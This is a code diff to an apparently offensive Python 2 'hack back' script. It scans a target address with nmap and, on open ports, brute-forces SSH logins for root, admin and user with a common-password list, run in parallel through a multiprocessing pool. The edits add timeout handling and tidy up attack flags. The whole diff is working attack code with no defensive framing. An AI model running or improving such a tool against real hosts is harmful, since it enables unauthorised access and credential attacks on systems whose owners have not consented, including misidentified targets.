@@ -1,4 +1,4 @@
-from multiprocessing import Pool
+import multiprocessing
 import paramiko
 import random
 import time
@@ -106,6 +106,7 @@ def attempt(ip,uname,passwd):
     try:
         connected, reply = create_ssh_connection(ip, uname, passwd)
     except: # TODO: Be more precise here
+        connected = False
         pass
     if connected:
         print '\033[1m[**] \033[34mSuccessfully Logged into %s@%s:%s\033[0m' % \
@@ -119,7 +120,7 @@ def attempt(ip,uname,passwd):
 
 
 def hack_back(ip, determined):
-    p = Pool(processes=4)
+    p = multiprocessing.Pool(processes=4)
     success = {}
     names = ['root', 'admin', 'user']  #
     start = time.time()
@@ -136,9 +137,12 @@ def hack_back(ip, determined):
     print '... Bruteforcing %s' % ip
     for u in names:
         for pw in common:
-            # connected, credentials = attempt(ip, u, pw)
-            event = p.apply_async(func=attempt, args=(ip, u, pw))
-            connected, success = event.get(timeout=120)
+            try:
+                event = p.apply_async(func=attempt, args=(ip, u, pw))
+                connected, success = event.get(timeout=120)
+            except multiprocessing.TimeoutError:
+                connected = False; success = ''
+                pass
             if connected:
                 break
         if connected:
@@ -159,7 +163,6 @@ def attack(address, strong):
     # scan = 'nmap -p U:53,135,137,T:21-25,80,139,8080,5000 %s >> scan.txt' % address
     print '\033[1m========= \033[31mScanning %s \033[0m\033[1m=========\033[0m' % address
     for line in cmd(scan):
-        attacking = False
         # p = Pool(processes=4)
         try:
             if line.split(' open ')[1]:
@@ -172,11 +175,9 @@ def attack(address, strong):
                         bruted, credentials = hack_back(address, strong)
                         if bruted:
                             print '!! Bruteforcecd in %s second' % str(time.time()-t0)
-                        attacking = True
                 except IndexError:
                     pass
-            # if attacking:
-            #     revenge.join()
+
         except IndexError:
             pass
         try:
@@ -189,8 +190,6 @@ def attack(address, strong):
                         attacking = True
                 except ValueError:
                     pass
-            # if attacking:
-            #     revenge.join()
         except IndexError:
             pass
 
